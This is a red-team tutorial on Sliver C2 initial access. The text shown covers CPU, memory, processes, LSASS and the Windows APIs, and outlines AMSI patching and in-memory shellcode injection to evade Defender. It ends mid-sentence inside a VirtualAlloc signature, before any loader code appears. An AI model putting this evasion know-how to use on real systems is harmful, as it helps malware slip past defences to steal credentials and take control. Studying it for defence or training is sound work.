# Initial Access with Sliver C2 - THE COMPLETE GUIDE
## From Zero Knowledge to Building Evasive Payloads

---

# TABLE OF CONTENTS

**FOUNDATION CONCEPTS**
1. [Computer Architecture Basics](#part-1-computer-architecture)
2. [What is Windows Defender](#part-2-windows-defender)
3. [What are Windows APIs](#part-3-windows-apis)
4. [Memory Management](#part-4-memory-management)
5. [Processes and Threads](#part-5-processes-threads)

**SECURITY CONCEPTS**
6. [How Malware Gets Detected](#part-6-detection)
7. [What is AMSI](#part-7-amsi)
8. [What is ETW](#part-8-etw)
9. [What is Shellcode](#part-9-shellcode)

**PRACTICAL ATTACK**
10. [What is C2](#part-10-c2)
11. [Setting Up Sliver](#part-11-sliver)
12. [Building the Loader](#part-12-loader)
13. [Executing the Attack](#part-13-attack)
14. [Post-Exploitation Commands](#part-14-postexploit)
15. [Troubleshooting Common Issues](#part-15-troubleshoot)
16. [MITRE ATT&CK Mapping](#part-16-mitre)
17. [Persistence with Defender Bypass](#part-17-persistence)
18. [Interview Questions](#part-18-interview)
19. [Cleanup and Next Steps](#part-19-cleanup)

---

# PART 1: Computer Architecture Basics {#part-1-computer-architecture}

Before we build malware that bypasses security, we need to understand how computers actually work. This section teaches you through hands-on exercises - you will run commands, see output, and understand what's happening at each step.

**Why is this important for hacking?**

See, many people just copy-paste code from GitHub and run exploits. But when something breaks, they are stuck. When you understand the fundamentals - CPU, RAM, how programs actually run - you can:

1. Debug your own malware when it crashes
2. Understand why certain bypass techniques work
3. Develop new techniques that no antivirus has seen
4. Answer interview questions confidently
5. Think like a real attacker, not just a script kiddie

So let's start from the very basics. No assumptions. Even if you know some of this, read it properly - I will connect every concept to actual attacks.

---

## 1.1: The CPU - What Actually Executes Your Code

### What is the CPU?

The **CPU (Central Processing Unit)** is a chip that reads instructions and executes them. Every program, every click, every action on your computer ultimately becomes instructions that the CPU processes one by one.

**Let me explain this more clearly:**

Your computer has many components - hard disk, RAM, keyboard, monitor, etc. But only ONE component actually "does work" - that is the CPU. Everything else is just storage or input/output.

When you double-click on Chrome, what happens?

1. Windows reads Chrome.exe from your hard disk
2. Windows copies the code into RAM (memory)
3. Windows tells the CPU: "Start executing from this memory address"
4. CPU starts reading instructions and doing them

The CPU is doing ALL the work. It is adding numbers, comparing values, moving data, jumping to different parts of code - everything.

**Why does this matter for hacking?**

When we inject shellcode, we are basically giving the CPU NEW instructions to execute. The CPU doesn't know the difference between "legitimate code from Microsoft" and "malicious code from a hacker." It just reads bytes and does what they say.

This is the fundamental reason why code injection attacks work. The CPU is a dumb machine - very fast, but dumb. It will execute whatever you give it.

### How the CPU Works - The Fetch-Decode-Execute Cycle

The CPU runs an endless cycle, billions of times per second:

```
1. FETCH   - Read the next instruction from RAM
2. DECODE  - Figure out what the instruction means  
3. EXECUTE - Do the operation (add, compare, jump, etc.)
4. REPEAT  - Go to the next instruction
```

**Let me explain each step in detail:**

**Step 1 - FETCH:**
The CPU has a special register called the "Instruction Pointer" (IP) or "Program Counter" (PC). This register holds the memory address of the NEXT instruction to execute.

So if IP = 0x00401000, the CPU reads the bytes at memory address 0x00401000.

**Step 2 - DECODE:**
The CPU looks at the bytes it fetched and figures out: "Okay, this byte sequence means ADD these two registers" or "This means JUMP to a different address."

**Step 3 - EXECUTE:**
The CPU actually does the operation. If it's ADD, it adds. If it's JUMP, it changes the IP to point to the new location.

**Step 4 - REPEAT:**
The IP is incremented (or changed if there was a JUMP), and the cycle continues.

Modern CPUs do this **billions of times per second**. A 3 GHz CPU does about 3 billion cycles per second. This is why computers are so fast.

**Attack relevance:**

When we inject shellcode, we are manipulating this cycle. We:
1. Put our malicious bytes into memory (using VirtualAlloc)
2. Change the IP to point to our malicious bytes (using CreateThread)
3. CPU starts executing OUR code instead of legitimate code

### What is an Instruction? (In Simple Terms)

An instruction is the smallest operation a CPU can perform. Think of it as a single command.

Here are real x86-64 instructions that you will see in shellcode:

| Instruction | What it does | Why it matters |
|-------------|--------------|----------------|
| `ADD RAX, RBX` | Add the value in register RBX to register RAX | Math operations |
| `MOV RCX, 5` | Put the number 5 into register RCX | Moving data around |
| `CMP RAX, 0` | Compare RAX to zero (sets flags for next instruction) | Checking conditions |
| `JNZ label` | Jump to 'label' if the last comparison was not zero | Changing program flow |
| `CALL function` | Call a function (save return address, jump there) | Running API functions |
| `RET` | Return from function (go back to saved address) | Finishing a function |
| `PUSH RAX` | Save RAX value onto the stack | Saving data temporarily |
| `POP RAX` | Restore RAX value from the stack | Getting saved data back |
| `XOR RAX, RAX` | XOR RAX with itself (makes it zero) | Clearing a register |
| `NOP` | Do nothing (No Operation) | Padding, NOPsleds |

A program is just a LONG sequence of these simple instructions. Even complex software like Chrome or Microsoft Word is ultimately just millions of these basic instructions.

**Shellcode is also just a sequence of these instructions!**

When security researchers look at shellcode, they don't see "hacker magic." They see normal CPU instructions arranged in a specific way to do malicious things (like connecting back to your C2 server).

### What is Machine Code? (The CPU's Language)

The CPU only understands numbers. It cannot read English or any programming language. Each instruction is encoded as bytes (numbers in hexadecimal).

**Example - Let's see real machine code:**

```
Machine Code (hex)     Assembly (human-readable)
--------------------------------------------------
55                     push rbp
48 89 E5               mov rbp, rsp
B8 05 00 00 00         mov eax, 5
5D                     pop rbp
C3                     ret
```

**Breaking this down:**

- `55` is one byte - when the CPU sees this byte, it knows "push rbp"
- `48 89 E5` is three bytes - this means "mov rbp, rsp"
- `B8 05 00 00 00` is five bytes - "mov eax, 5" (the 05 00 00 00 is the number 5 in little-endian format)
- `5D` is one byte - "pop rbp"
- `C3` is one byte - "return from function"

**The key insight:** Assembly language (push, mov, add, etc.) is just a human-readable version of machine code. When you "compile" assembly, you get these raw bytes. When you "disassemble" a program, you convert bytes back to assembly.

**Shellcode is literally these raw bytes!**

When Sliver generates shellcode, it gives you bytes like:
```
\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50...
```

Each `\x` is one byte in hex. `\xfc` means byte value 252 in decimal, or FC in hexadecimal. This is an actual CPU instruction!

### HANDS-ON EXERCISE 1: See Machine Code From Your Own C Program

This exercise will show you exactly how your code becomes machine code. You will see the connection between your C program and the raw bytes the CPU executes.

**On Linux (Kali):**

**Step 1 - Create a simple C program:**

```bash
# Open nano text editor
nano add.c
```

Type this code (I will explain every line):

```c
#include <stdio.h>   // Include library for printf function

int main() {         // Entry point of the program
    int a = 5;       // Create variable 'a', store value 5
    int b = 10;      // Create variable 'b', store value 10
    int result = a + b;  // Add them, store in 'result'
    printf("Result: %d\n", result);  // Print the result
    return 0;        // Exit with success code
}
```

Save and exit: Press Ctrl+O (to save), then Enter (to confirm), then Ctrl+X (to exit).

**Step 2 - Compile the program:**

```bash
gcc add.c -o add
```

**What just happened here?**

gcc is the GNU C Compiler. It does several things:

1. **Preprocessing** - Handles the `#include` directives
2. **Compilation** - Converts C code to assembly language
3. **Assembly** - Converts assembly to machine code (object file)
4. **Linking** - Combines all object files and libraries into final executable

The output file `add` now contains machine code that the CPU can execute directly.

**Step 3 - Run your program:**

```bash
./add
```

Output:
```
Result: 15
```

Your CPU just executed the machine code! The bytes that gcc created were read by the CPU and executed.

**Step 4 - See the actual machine code:**

```bash
objdump -d add | grep -A 20 "<main>:"
```

**What is objdump?**
objdump is a tool that "disassembles" a binary file. It reads the raw bytes and converts them back to assembly language so humans can understand.

**Output (your addresses will differ):**

```
0000000000001149 <main>:
    1149:   f3 0f 1e fa             endbr64 
    114d:   55                      push   %rbp
    114e:   48 89 e5                mov    %rsp,%rbp
    1151:   48 83 ec 10             sub    $0x10,%rsp
    1155:   c7 45 f4 05 00 00 00    movl   $0x5,-0xc(%rbp)
    115c:   c7 45 f8 0a 00 00 00    movl   $0xa,-0x8(%rbp)
    1163:   8b 55 f4                mov    -0xc(%rbp),%edx
    1166:   8b 45 f8                mov    -0x8(%rbp),%eax
    1169:   01 d0                   add    %edx,%eax
    116b:   89 45 fc                mov    %eax,-0x4(%rbp)
```

**Understanding the output format:**

```
ADDRESS:  MACHINE_CODE_BYTES       ASSEMBLY_INSTRUCTION
1155:     c7 45 f4 05 00 00 00    movl   $0x5,-0xc(%rbp)
```

- `1155` = Memory address where this instruction lives
- `c7 45 f4 05 00 00 00` = The actual bytes (machine code)
- `movl $0x5,-0xc(%rbp)` = Assembly language (human readable)

**Let's break this down line by line:**

| Address | Machine Code | Assembly | Your C Code |
|---------|--------------|----------|-------------|
| 1155 | `c7 45 f4 05 00 00 00` | `movl $0x5,-0xc(%rbp)` | `int a = 5;` |
| 115c | `c7 45 f8 0a 00 00 00` | `movl $0xa,-0x8(%rbp)` | `int b = 10;` |
| 1163 | `8b 55 f4` | `mov -0xc(%rbp),%edx` | Load 'a' into register |
| 1166 | `8b 45 f8` | `mov -0x8(%rbp),%eax` | Load 'b' into register |
| 1169 | `01 d0` | `add %edx,%eax` | `a + b` |
| 116b | `89 45 fc` | `mov %eax,-0x4(%rbp)` | Store result |

**The critical understanding:**

The CPU doesn't see your C code. It doesn't know what "int" means. It doesn't understand variable names like "a" or "b".

The CPU only sees: `c7 45 f4 05 00 00 00`

And it executes: "Put the value 5 at this memory location."

**This is the exact same thing that happens with shellcode!**

When we inject shellcode, the CPU sees bytes like `\xfc\x48\x83\xe4\xf0` and executes them. The CPU doesn't know if these bytes came from:
- A legitimate program compiled by a developer
- Microsoft
- A hacker's shellcode

It just reads the bytes and does what they say. **This is WHY code injection works.**

### Why This Matters for Red Team Operations

Now you understand the fundamental truth: **The CPU executes whatever bytes you give it.**

When we do process injection:

1. We allocate memory in a target process (VirtualAllocEx)
2. We copy our shellcode bytes into that memory (WriteProcessMemory)
3. We tell the CPU to start executing at that address (CreateRemoteThread)

The CPU happily executes our malicious bytes because it doesn't know they are malicious. It just sees bytes and follows instructions.

**Security implications:**

This is why modern security tools focus on:
- Detecting suspicious memory allocations
- Monitoring for executable memory regions
- Watching for CreateRemoteThread calls
- Looking for injected code in processes

And our job as attackers is to do these things in ways that avoid detection.

---

## 1.2: RAM - Where Running Code Lives

### What is RAM?

**RAM (Random Access Memory)** is temporary storage where all running programs exist. When you run `./add`, the operating system:

1. Reads the file from disk
2. Copies the code into RAM
3. Points the CPU at that RAM location
4. CPU starts executing

**Why is RAM needed? Why not run directly from disk?**

Good question. Hard disks are SLOW. A hard disk can read maybe 100-500 megabytes per second. But the CPU can process billions of instructions per second. If the CPU had to read every instruction from disk, it would spend 99.99% of its time waiting.

RAM is FAST. It can feed data to the CPU at the speed the CPU needs. So we copy programs from disk to RAM, and then execute from RAM.

**For attackers, this creates an opportunity:**

If we can put our code directly into RAM without writing to disk, antivirus cannot scan the file because there IS no file on disk. This is called "fileless malware" or "in-memory execution."

### RAM vs Disk - The Critical Difference for Evasion

| Property | Hard Disk | RAM |
|----------|-----------|-----|
| Speed | Slow (100-500 MB/s) | Fast (25-50 GB/s) |
| Persistence | Data survives reboot | Data lost on reboot |
| Antivirus scanning | YES - AV scans files on disk | LIMITED - Harder to scan |
| Forensics | Files can be recovered | Volatile, harder to analyze |
| Our goal | AVOID writing here | Execute our code HERE |

**This is why we build in-memory loaders:**

Our loader will:
1. Receive encrypted shellcode (so it looks random/harmless)
2. Decrypt it in memory (RAM)
3. Execute it from memory (RAM)
4. Never write the decrypted shellcode to disk

Antivirus primarily scans files on disk. If we never create a malicious file on disk, we bypass a HUGE portion of antivirus detection.

### Key Properties of RAM

| Property | What it means | Why it matters |
|----------|---------------|----------------|
| **Volatile** | Cleared when power is off | Forensics: RAM evidence disappears on shutdown |
| **Fast** | ~100 nanoseconds access | CPU can read billions of bytes per second |
| **Byte-addressable** | Each byte has a unique address | We can read/write specific locations |

### How RAM is Organized

RAM is a giant array of bytes. Each byte has an address (a number).

```
Address (hex)    Contents
--------------------------------------------------
0x00000000       [byte 0]
0x00000001       [byte 1]
0x00000002       [byte 2]
...
0x7FFFFFFF       [byte ~2 billion - end of user space]
```

With 16 GB of RAM, you have about 17 billion addressable bytes.

### HANDS-ON EXERCISE 2: See What's in a Process's Memory (Linux)

Step 1 - Create a program that stays running:

```bash
nano loop.c
```

```c
#include <stdio.h>
#include <unistd.h>

int main() {
    int counter = 0;
    while(1) {
        counter++;
        printf("Count: %d\n", counter);
        sleep(2);
    }
    return 0;
}
```

Step 2 - Compile and run in background:

```bash
gcc loop.c -o loop
./loop &
```

The `&` runs it in the background. You'll see output like:
```
[1] 12847
Count: 1
```

That `12847` is the **Process ID (PID)** - a unique number identifying this running program.

Step 3 - See the process's memory map:

```bash
cat /proc/12847/maps
```

(Replace 12847 with your actual PID)

**Output (partial):**

```
55a4c8a00000-55a4c8a01000 r--p 00000000 08:01 1234567  /home/user/loop
55a4c8a01000-55a4c8a02000 r-xp 00001000 08:01 1234567  /home/user/loop
55a4c8a02000-55a4c8a03000 r--p 00002000 08:01 1234567  /home/user/loop
7f8d4c000000-7f8d4c021000 rw-p 00000000 00:00 0 
7ffd5c9e0000-7ffd5ca01000 rw-p 00000000 00:00 0        [stack]
```

**What you're seeing:**

| Address Range | Permissions | What it is |
|---------------|-------------|------------|
| `55a4c8a01000-55a4c8a02000` | `r-xp` | The program's CODE (readable, executable) |
| `7ffd5c9e0000-7ffd5ca01000` | `rw-p` | The STACK (readable, writable) |

The `r-xp` means:
- `r` = readable
- `x` = executable (CPU can run code here)
- `p` = private (not shared)
- `-` = not writable

Step 4 - Kill the process:

```bash
kill 12847
```

### HANDS-ON EXERCISE 3: See Process Memory on Windows

Open PowerShell and run:

```powershell
# Start Notepad
Start-Process notepad
Start-Sleep -Seconds 2

# Get Notepad's process info
$proc = Get-Process notepad

# See basic info
$proc | Format-List Id, ProcessName, WorkingSet64, VirtualMemorySize64
```

**Output:**

```
Id                 : 8472
ProcessName        : notepad
WorkingSet64       : 16629760
VirtualMemorySize64: 2199127543808
```

**What this tells you:**

- `Id: 8472` - This is Notepad's PID (Process ID)
- `WorkingSet64: 16629760` - Notepad is using ~16 MB of RAM right now
- `VirtualMemorySize64` - Total virtual address space (huge because 64-bit)

Now kill it:

```powershell
Stop-Process -Id 8472
```

### The Critical Insight for Attackers

RAM doesn't know the difference between "code" and "data." Both are just bytes. What makes bytes become "executable code" is:

1. The bytes are in a memory region marked as executable (`r-x`)
2. The CPU's instruction pointer (RIP register) points there

**If you can:**
1. Write your bytes into RAM
2. Mark that region as executable
3. Make the CPU jump there

**Then your code runs.** This is the foundation of shellcode injection.

---

## 1.3: Disk vs Memory - Why In-Memory Attacks Work

### The Difference

| Aspect | Disk (Storage) | RAM (Memory) |
|--------|----------------|--------------|
| Speed | Slow (milliseconds) | Fast (nanoseconds) |
| Persistence | Survives power off | Cleared on power off |
| Scanning | **Heavily scanned by AV** | Harder to scan continuously |
| Forensics | Files remain as evidence | Gone when power is off |

### Why Disk Gets Scanned

When you download a file:

1. File lands on disk
2. Windows Defender's file system filter sees the write
3. Defender scans the file against signature database
4. If it matches known malware → **BLOCKED**

This happens for every file: downloads, extractions, copies.

### Why Memory is Different

If code only exists in RAM and never touches disk:

- There's no file for signature scanning
- Fewer forensic artifacts
- Code disappears on reboot

This is called **in-memory execution** or **fileless malware**.

### HANDS-ON: See Defender Scan a File

On Windows, download any file and watch:

```powershell
# Watch Defender's service
Get-Process MsMpEng | Format-List CPU
```

The `MsMpEng.exe` process is Defender's core engine. Its CPU usage spikes when scanning.

---

## 1.4: The Operating System's Role

### What the OS Does

The **Operating System (OS)** is software that:

1. **Manages hardware** - talks to CPU, RAM, disk, network
2. **Runs programs** - loads code, schedules execution
3. **Enforces security** - controls what programs can access
4. **Provides services** - APIs for file access, networking, etc.

Windows, Linux, and macOS are operating systems.

### Why the OS Matters for Attacks

Every action our malware takes goes through the OS:

| Our Action | How it works under the hood |
|------------|----------------------------|
| Allocate memory | We call `VirtualAlloc()` → OS maps RAM for us |
| Run shellcode | We create a thread → OS schedules it on CPU |
| Talk to C2 | We open socket → OS handles network stack |
| Read files | We call `ReadFile()` → OS accesses disk for us |

**The OS is both a barrier and a tool:**
- Barrier: It enforces security (permissions, isolation)
- Tool: It provides the APIs we use to do things

### System Architecture

```
+--------------------------------------------------+
|                YOUR PROGRAM                       |
|      (Chrome, Notepad, malware, anything)        |
|                                                  |
|             RUNS IN USER MODE (Ring 3)           |
|              Restricted - can't access           |
|              other programs or hardware          |
+--------------------------------------------------+
                        |
                        | System Calls (APIs)
                        v
+--------------------------------------------------+
|              WINDOWS KERNEL                       |
|      (ntoskrnl.exe, drivers)                     |
|                                                  |
|             RUNS IN KERNEL MODE (Ring 0)         |
|              Full access to everything           |
+--------------------------------------------------+
                        |
                        | Direct Control
                        v
+--------------------------------------------------+
|                 HARDWARE                          |
|         CPU, RAM, Disk, Network Card             |
+--------------------------------------------------+
```

---

## 1.5: User Mode vs Kernel Mode

### What Are These Modes?

The CPU has built-in **privilege levels** called rings. Windows uses two:

| Mode | Ring | Who runs here | What it can do |
|------|------|---------------|----------------|
| **User Mode** | Ring 3 | Applications (Chrome, Notepad, malware) | Restricted |
| **Kernel Mode** | Ring 0 | Windows kernel, drivers | Unrestricted |

### What User Mode CANNOT Do

Programs running in User Mode (Ring 3) cannot:

- Read or write another process's memory
- Access hardware directly (disk, network card, GPU)
- Execute privileged CPU instructions
- Modify kernel memory

If a User Mode program tries these things, the CPU raises an exception and Windows terminates it.

### What Kernel Mode CAN Do

Code running in Kernel Mode (Ring 0) can:

- Read/write any memory address (any process, even kernel)
- Execute any CPU instruction
- Directly control hardware
- Modify any OS structure

**This is why security tools like Defender run in kernel mode** - they need to see everything.

### Why Separation Matters

If every program had kernel access:
- One buggy program could crash the entire system
- Malware could instantly steal everything
- No process isolation would exist

User Mode isolation means:
- A crashed program only crashes itself
- Programs can't read each other's memory
- Security boundaries exist

### System Calls: Crossing the Boundary

When your User Mode program needs kernel services, it makes a **system call**.

**Example: Reading a file**

When you call `ReadFile()` in your program:

```
Your program calls ReadFile()
        |
        v
kernel32.dll translates to NtReadFile
        |
        v
ntdll.dll sets up parameters, executes SYSCALL instruction
        |
        v
================== RING 3/0 BOUNDARY ==================
        |
        v
Kernel receives the call, validates permissions
        |
        v
Kernel reads data from disk
        |
        v
Kernel copies data to your buffer
        |
        v
================== RING 0/3 BOUNDARY ==================
        |
        v
Control returns to your program with the data
```

### HANDS-ON: See the Privilege Difference

On Windows PowerShell:

```powershell
# Start Notepad
Start-Process notepad
Start-Sleep -Seconds 2

# Get Notepad's process object
$proc = Get-Process notepad

# You can see basic info (User Mode access)
$proc.Id
$proc.WorkingSet64

# But you can't read its memory arbitrarily
# That would require OpenProcess + ReadProcessMemory with special privileges
```

You can **see** that Notepad exists and basic stats, but you can't read its internal data. That memory isolation is enforced by the CPU's privilege rings.

---

## 1.6: Processes and Process IDs

### What is a Process?

A **process** is a running instance of a program. When you double-click notepad.exe:

1. Windows creates a new process
2. Allocates memory for it
3. Loads the code from disk
4. Starts execution

### What a Process Contains

| Component | What it is |
|-----------|------------|
| **PID** | Unique Process ID number |
| **Memory space** | Its own isolated RAM (code, heap, stack) |
| **Threads** | At least one thread that executes code |
| **Token** | Security identity (who is running this?) |
| **Handles** | References to files, registry keys, etc. |

### HANDS-ON: See Running Processes

**On Windows:**

```powershell
# See all processes with their PIDs
Get-Process | Select-Object Id, ProcessName | Sort-Object Id | Select-Object -First 20
```

Output:
```
  Id ProcessName
  -- -----------
   0 Idle
   4 System
 156 Registry
 488 smss
 596 csrss
 676 wininit
 684 csrss
 768 winlogon
 ...
```

Each line is a separate process with its own memory space.

```powershell
# Count total processes
(Get-Process).Count
```

You'll probably see 200-400 processes running.

**On Linux:**

```bash
ps aux | head -20
```

### Why Processes Matter for Attacks

Your malware runs as a process. To evade detection:

- You might inject into another process (look like Chrome instead of evil.exe)
- Parent-child relationships are logged - spawning child processes leaves traces
- Security tools monitor process creation events

---

## 1.7: The LSASS Process - Why Attackers Target It

### What is LSASS?

**LSASS** = Local Security Authority Subsystem Service (`lsass.exe`)

It's the Windows process responsible for:
- User authentication (validating passwords)
- Creating security tokens when users log in
- Enforcing security policies

### Why Attackers Care

When a user logs in, LSASS:
1. Receives their credentials
2. Validates them against Active Directory
3. **Caches credential data in memory** (for single sign-on)

If you can read LSASS memory, you can extract:
- NTLM password hashes
- Kerberos tickets
- Sometimes plaintext passwords

**This is what Mimikatz does.**

### HANDS-ON: Find LSASS

```powershell
Get-Process lsass | Format-List Id, ProcessName, WorkingSet64
```

Output:
```
Id            : 672
ProcessName   : lsass
WorkingSet64  : 17281024
```

That ~17 MB of RAM contains cached credentials.

**But you can't just read it:**
- Reading LSASS memory requires Administrator or SYSTEM privileges
- Requires specific APIs (OpenProcess, ReadProcessMemory)
- These operations are heavily monitored by security tools

---

## 1.8: Summary - How This Connects to Attacks

| Concept | Attack Relevance |
|---------|------------------|
| **CPU executes any bytes** | Shellcode = raw bytes we inject and run |
| **RAM holds running code** | In-memory attacks avoid disk scanning |
| **Disk is heavily scanned** | Files get caught by signature matching |
| **User Mode is restricted** | We can't directly access other processes |
| **Kernel Mode is powerful** | Defender runs here, watching us |
| **Processes are isolated** | We need injection techniques to cross |
| **LSASS has credentials** | High-value target for post-exploitation |

### Interview Questions You Can Now Answer

**Q: What is the difference between User Mode and Kernel Mode?**

**A:** User Mode (Ring 3) is restricted - programs can only access their own memory and must make system calls to request privileged operations from the kernel. Kernel Mode (Ring 0) has full access to all memory, hardware, and can execute any CPU instruction. The separation exists so that buggy or malicious applications cannot crash the entire system or access other programs' data. Security tools like Windows Defender often run kernel drivers because they need unrestricted access to monitor everything.

**Q: Why do attackers prefer in-memory execution?**

**A:** Files on disk get scanned by antivirus at multiple points: when downloaded, when extracted, when executed. Code that exists only in memory never creates a file for signature scanning. Additionally, RAM is volatile - it's cleared when the system powers off, leaving fewer forensic artifacts. In-memory execution avoids file-based detection and reduces evidence.

**Q: What is a process and why does isolation matter?**

**A:** A process is a running instance of a program. Each process has its own isolated memory space, PID, security token, and handles. Isolation means one process cannot directly read another process's memory - this is enforced by the CPU's privilege levels. For attackers, this means we need techniques like process injection to execute code in another process's context.

---

# PART 2: What is Windows Defender {#part-2-windows-defender}

## 2.1: Definition

**Windows Defender** is the built-in antimalware software in Windows 10 and Windows 11. Its official name is Microsoft Defender Antivirus.

## 2.2: Components of Windows Defender

Windows Defender consists of multiple components:

### 2.2.1: MsMpEng.exe (Antimalware Service Executable)

**What it is:** The main process that performs scanning

**What it does:**
- Scans files when they are created, opened, or executed
- Performs periodic full system scans
- Loads and uses signature databases

### 2.2.2: Signature Database

**What it is:** A database of patterns that identify known malware

**What it does:**
- Contains byte patterns (signatures) for known malware
- When a file matches a signature, it is flagged as malicious
- Updated regularly through Windows Update

### 2.2.3: Cloud Protection

**What it is:** Connection to Microsoft's cloud servers for threat intelligence

**What it does:**
- Sends file hashes and metadata to Microsoft for analysis
- Receives information about new threats in real-time
- Enables faster detection of new malware variants

### 2.2.4: Behavior Monitoring

**What it is:** Real-time monitoring of program actions

**What it does:**
- Watches what programs do (not just what they contain)
- Detects suspicious behaviors like encrypting many files (ransomware)
- Can terminate programs that exhibit malicious behavior

### 2.2.5: AMSI (Antimalware Scan Interface)

**What it is:** An interface that lets Windows scan script content before execution

**What it does:**
- Scans PowerShell commands before they execute
- Scans .NET assemblies before they load
- Detects malicious scripts even if they are not on disk

We will cover AMSI in detail in Part 7.

## 2.3: When Defender Scans

**Static scanning (before execution):**
1. When you download a file
2. When you copy a file
3. When you extract an archive
4. When you double-click to execute

**Runtime scanning (during execution):**
1. When PowerShell executes a script (via AMSI)
2. When .NET loads an assembly (via AMSI)
3. When a program makes suspicious API calls

**Behavioral scanning (after execution starts):**
1. Continuous monitoring of file system changes
2. Monitoring of network connections
3. Monitoring of process creation

## 2.4: How Defender Blocks Threats

When Defender detects a threat:

1. **Quarantine:** The file is moved to a secure location where it cannot execute
2. **Block execution:** If the file is running, the process is terminated
3. **Notification:** User is informed of the detection
4. **Reporting:** Information is sent to Microsoft (if cloud protection is enabled)

## 2.5: What "Bypass" Means

When we say we will "bypass" Defender, we mean:

1. We create a payload that does not match known signatures
2. We disable or patch AMSI so runtime scanning fails
3. We execute our code in a way that avoids triggering behavioral detection

We are not disabling Defender. We are making our payload undetectable to its scanning methods.

---

# PART 3: What are Windows APIs {#part-3-windows-apis}

## 3.1: What is an API?

**API** stands for **Application Programming Interface**. It's a set of functions that programs call to request services from the operating system.

### Why APIs Exist

Programs run in User Mode (Ring 3) and cannot directly access hardware or kernel resources. When a program needs to:
- Read a file from disk
- Allocate memory
- Create a network connection
- Start another program

It must **ask the kernel** through an API call.

### How an API Call Works

```
Your program                    Windows Kernel
-----------                     --------------
    |                               |
    |  Call ReadFile()              |
    |------------------------------>|
    |                               |  Access disk hardware
    |                               |  Read the data
    |                               |
    |  Return: data + success/fail  |
    |<------------------------------|
    |                               |
```

Your program never touches the disk directly. It calls the API, and the kernel does the work.

### HANDS-ON: See API Calls in Action

On Windows PowerShell, let's see what happens when we read a file:

```powershell
# Create a test file
"Hello World" | Out-File -FilePath C:\temp\test.txt

# Read it back
Get-Content C:\temp\test.txt
```

Behind the scenes:
1. PowerShell calls `CreateFile()` API to open the file
2. PowerShell calls `ReadFile()` API to read the contents
3. PowerShell calls `CloseHandle()` API to close the file

Each call crosses from User Mode to Kernel Mode and back.

---

## 3.2: Where Do APIs Live? (DLL Files)

### What is a DLL?

**DLL** stands for **Dynamic Link Library**. A DLL is a file containing compiled code (functions) that programs can use.

Instead of every program containing its own code for reading files, allocating memory, etc., Windows provides DLLs with this code pre-written. Programs just call functions in the DLLs.

### The Main Windows DLLs

| DLL File | What's inside | Why it matters for attacks |
|----------|--------------|----------------------------|
| **kernel32.dll** | Core Win32 functions: files, memory, processes | Most APIs we use (VirtualAlloc, CreateThread) |
| **ntdll.dll** | Native API layer, system calls | This is where AMSI/ETW patches happen |
| **user32.dll** | GUI functions: windows, buttons, messages | Not used in our attack |
| **advapi32.dll** | Security, registry, services | Used for privilege operations |
| **amsi.dll** | AMSI scanning functions | We will patch this to bypass script scanning |

### How Programs Use DLLs

When a program starts:

1. Windows' loader reads the program's import table
2. Loader finds which DLLs the program needs
3. Loader maps those DLLs into the process's memory
4. Program can now call functions in those DLLs

### HANDS-ON: See DLLs Loaded in a Process

**On Windows PowerShell:**

```powershell
# Start Notepad
Start-Process notepad
Start-Sleep -Seconds 2

# Get the process
$proc = Get-Process notepad

# See all loaded modules (DLLs)
$proc.Modules | Select-Object ModuleName, FileName | Format-Table -AutoSize
```

**Output:**

```
ModuleName           FileName
----------           --------
notepad.exe          C:\Windows\System32\notepad.exe
ntdll.dll            C:\Windows\System32\ntdll.dll
KERNEL32.DLL         C:\Windows\System32\KERNEL32.DLL
KERNELBASE.dll       C:\Windows\System32\KERNELBASE.dll
GDI32.dll            C:\Windows\System32\GDI32.dll
win32u.dll           C:\Windows\System32\win32u.dll
...
```

You can see Notepad has loaded `ntdll.dll`, `KERNEL32.DLL`, and many others. Each DLL provides functions that Notepad uses.

```powershell
# Count how many DLLs are loaded
$proc.Modules.Count
```

Probably 60-100+ DLLs!

### For Our Malware

**The attack flow using DLLs:**

We will:
1. Load `amsi.dll` using `LoadLibrary()` - Get AMSI's code into our memory
2. Find `AmsiScanBuffer` function using `GetProcAddress()` - Get exact address
3. Modify that function's code to disable AMSI scanning - Replace its instructions

**Why does this work?**

When a DLL is loaded into your process, it becomes part of YOUR memory space. You can read it, and with the right permissions (VirtualProtect), you can WRITE to it.

This is the fundamental weakness we exploit: security DLLs run in the same process as the attacker's code.

## 3.3: The Specific APIs We Will Use

Now let me explain each API function we will use in our loader. Understanding these is critical because:
1. They are asked in interviews all the time
2. You need to understand them to modify and improve the loader
3. They are the building blocks of ALL Windows shellcode loaders

**Quick reference table:**

| API Function | Purpose in our attack | DLL |
|--------------|----------------------|-----|
| `LoadLibrary` | Load amsi.dll/ntdll.dll so we can patch them | kernel32.dll |
| `GetProcAddress` | Find exact address of functions to patch | kernel32.dll |
| `VirtualAlloc` | Allocate executable memory for shellcode | kernel32.dll |
| `VirtualProtect` | Change memory permissions (make writable) | kernel32.dll |
| `Marshal.Copy` | Copy bytes (our patch/shellcode) to memory | .NET Framework |
| `CreateThread` | Start executing our shellcode | kernel32.dll |
| `WaitForSingleObject` | Wait for shellcode to finish | kernel32.dll |

### LoadLibrary

**What it does:** Loads a DLL file into your program's memory

**Simpler:** "Windows, I want to use amsi.dll. Load it into my process so I can access its functions."

**Technical signature:**
```c
HMODULE LoadLibrary(
    LPCSTR lpLibFileName    // Name of the DLL to load
);
```

**Parameters:**
- `lpLibFileName`: The name of the DLL file. Example: "amsi.dll" or "kernel32.dll"

**Return value:**
- **Success:** A "handle" (a number identifying the loaded DLL)
- **Failure:** NULL (which equals 0)

**Why we use it in our attack:**
We need to load amsi.dll so we can find and patch the AmsiScanBuffer function to disable AMSI scanning.

### GetProcAddress

**What it does:** Finds where a specific function is located in memory

**Simpler:** "Now that amsi.dll is loaded, tell me the exact memory address of the AmsiScanBuffer function."

**Technical signature:**
```c
FARPROC GetProcAddress(
    HMODULE hModule,        // Handle to the DLL (from LoadLibrary)
    LPCSTR  lpProcName      // Name of the function to find
);
```

**Parameters:**
- `hModule`: The handle we got from LoadLibrary
- `lpProcName`: The name of the function we want. Example: "AmsiScanBuffer"

**Return value:**
- **Success:** The memory address where the function starts
- **Failure:** NULL (0)

**Why we use it in our attack:**
We need to know exactly where AmsiScanBuffer is located so we can overwrite its code with our patch.

### VirtualAlloc

**What it does:** Asks Windows to give you some RAM to use

**In plain English:** "Hey Windows, I need [X] bytes of memory. Also, I want to be able to write to it AND execute it as code."

**Technical signature:**
```c
LPVOID VirtualAlloc(
    LPVOID lpAddress,           // Where to put the memory (NULL = let Windows decide)
